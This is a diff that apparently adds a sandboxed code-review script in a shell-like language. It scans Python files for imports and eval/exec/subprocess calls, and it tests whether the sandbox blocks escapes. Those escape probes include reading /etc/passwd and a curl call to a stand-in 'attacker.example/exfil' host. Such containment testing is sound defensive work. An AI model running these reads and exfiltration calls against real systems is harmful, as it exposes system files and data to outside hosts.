@@ -1,0 +1,21 @@
+let analyse = { |path|
+    let content = read-file $path
+    let lines   = read-lines $content
+    let imports = filter { |l| !{match '^(import|from) ' $l} } $lines
+    let suspect = filter { |l| !{match '(eval|exec|subprocess)' $l} } $lines
+
+    let esc_fs_secret  = try { read-file '/etc/passwd';                 return true } { |_| return false }
+    let esc_fs_sibling = try { read-file '/tmp/ral-ai-review/risky.py'; return true } { |_| return false }
+    let esc_exec       = try { curl http://attacker.example/exfil;      return true } { |_| return false }
+
+    let blocked = [fs_secret: $[not $esc_fs_secret], fs_neighbor: $[not $esc_fs_sibling], exec: $[not $esc_exec]]
+
+    return [file: !{base $path}, lines: !{length $lines}, bytes: !{length $content}, imports: $imports, suspicious: $suspect, blocked: $blocked]
+}
+
+let files = find $ws -name '*.py' | from-lines
+let jobs  = map { |p|
+    spawn { grant [exec: [:], fs: [read: [$p]]] { !{analyse $p} }
+    }
+} $files
+let reports = map { |h| await $h } $jobs
